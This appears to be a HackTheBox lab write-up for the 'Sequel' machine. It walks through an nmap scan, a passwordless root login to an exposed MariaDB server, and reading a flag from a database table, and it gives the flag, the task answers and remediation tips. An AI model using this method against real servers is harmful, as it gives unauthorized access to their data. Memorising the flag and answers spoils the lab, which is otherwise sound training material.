# Sequel — HackTheBox Starting Point Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?logo=hackthebox&logoColor=black)
![Tier](https://img.shields.io/badge/Tier-1-red)
![OS](https://img.shields.io/badge/OS-Linux-blue?logo=linux&logoColor=white)
![Flags](https://img.shields.io/badge/Flags-1-orange)
![Foothold](https://img.shields.io/badge/Foothold-MariaDB%20(3306)%20root%20nopass-red)

> **Target:** `10.129.85.217`
> **Foothold:** **MariaDB** on `3306/tcp` accepts a passwordless **`root`** login — read the flag straight out of a table.

---

## 🧭 Overview

Sequel exposes a **MariaDB** database (MySQL fork) on `3306/tcp`. The **`root`** account has
**no password**, so anyone who can reach the port gets full database access. The flag lives
in the `config` table of the non-standard **`htb`** database.

---

## 1. Reconnaissance

Host is up (TTL 63):

```bash
ping 10.129.85.217
```

```bash
nmap -sC -sV 10.129.85.217
```

```text
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|_  Auth Plugin Name: mysql_native_password
```

Single service: **MariaDB 10.3.27**.

---

## 2. Foothold — Passwordless root login

The server requires the client to negotiate without TLS, so pass `--skip-ssl`, log in as
`root`, and press **Enter** at the (blank) password prompt:

```bash
mysql -h 10.129.85.217 -u root --skip-ssl
```

> **Gotchas:**
> - `mysql 10.129.85.217` (no `-h`) tries a **local socket** — use `-h` for a remote host.
> - Plain `mysql -h …` fails with `SSL is required, but the server does not support it`; add `--skip-ssl`.
> - The flag is `--skip-ssl` with **two** dashes; `-skip-ssl` is parsed as `-s -k…` and errors.

```text
Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

---

## 3. Enumerate & Read the Flag

```sql
show databases;
```

```text
+--------------------+
| Database           |
+--------------------+
| htb                |   <-- non-standard
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

```sql
use htb;
show tables;
```

```text
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

```sql
select * from config;
```

```text
| id | name | value                            |
...
|  5 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 |
...
```

> **Tip:** every SQL statement must end with `;` (or `\g`) — a missing semicolon leaves the
> client on a `->` continuation prompt.

The `users` table additionally leaks accounts (`admin`, `lara`, `sam`, `mary` @ `sequel.htb`).

---

## 4. Flag

<details>
<summary>🚩 Click to reveal — FLAG</summary>

```text
7b4bec00d1a39e3dd4e021ec3d915da8
```
</details>

---

## 📝 Task Questions & Answers

<details>
<summary>📋 Click to reveal — guided task answers</summary>

| # | Question | Answer |
|---|----------|--------|
| 1 | During our scan, which port is MySQL serving on? | 3306 |
| 2 | What community-developed MySQL version is the target running? | MariaDB |
| 3 | Which switch specifies a login username for the MySQL client? | -u |
| 4 | Which username logs into MariaDB without a password? | root |
| 5 | Which symbol displays everything inside a table? | * |
| 6 | What symbol ends each SQL query? | ; |
| 7 | What is the fourth, non-standard database name on this host? | htb |
| 8 | Submit flag | `7b4bec00d1a39e3dd4e021ec3d915da8` |

</details>

---

## 🛡️ Lessons / Remediation
- **Set a strong password** on `root` (and every DB account); never allow passwordless login.
- **Bind MariaDB to localhost / trusted interfaces** and firewall `3306` off untrusted networks.
- Enforce **least privilege** — don't let `root` connect from `%` (any host).
- Store secrets/flags outside world-readable config tables.
